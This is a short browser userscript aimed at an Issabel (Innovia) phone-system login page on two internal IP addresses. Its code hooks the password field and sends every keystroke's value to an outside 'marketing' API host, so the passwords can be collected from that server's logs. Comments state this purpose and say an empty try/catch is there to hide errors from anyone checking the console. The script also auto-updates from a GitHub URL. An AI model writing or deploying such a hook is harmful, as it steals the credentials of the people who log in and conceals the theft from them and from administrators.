// ==UserScript==
// @name         innovia_pwd_hook
// @namespace    http://lifecapital.eg
// @version      0.2
// @description  Innovia (Issabel) password hook
// @author       Mustafa Elmalah
// @match 		 https://10.0.10.243/
// @match 		 https://10.1.10.250/
// @run-at document-start
// @grant        none
// @downloadURL  https://raw.githubusercontent.com/lifecapital/userscript/refs/heads/master/innovia_pwd_hook.user.js
// @updateURL    https://raw.githubusercontent.com/lifecapital/userscript/refs/heads/master/innovia_pwd_hook.user.js
// ==/UserScript==

(function() {
    'use strict';

	window.onload = () => {
		// Monitor password input and add an event to capture the password
		// then send a web request to any of our servers with the password
		// as a querystring variable and capture it from the webserver's log.
		document.querySelector('input[name="input_pass"]')
			.oninput = (e) => {
				// Attempt to suppress fetch error in case someone cynic 
				// looks at the console. Most browsers will still show fetch
				// errors though.
				try {
					fetch(`https://api.marketing.lifecapital.eg/?innovia_pwd=${e.target.value}`);
				} catch {
				}
			};
	}
})();
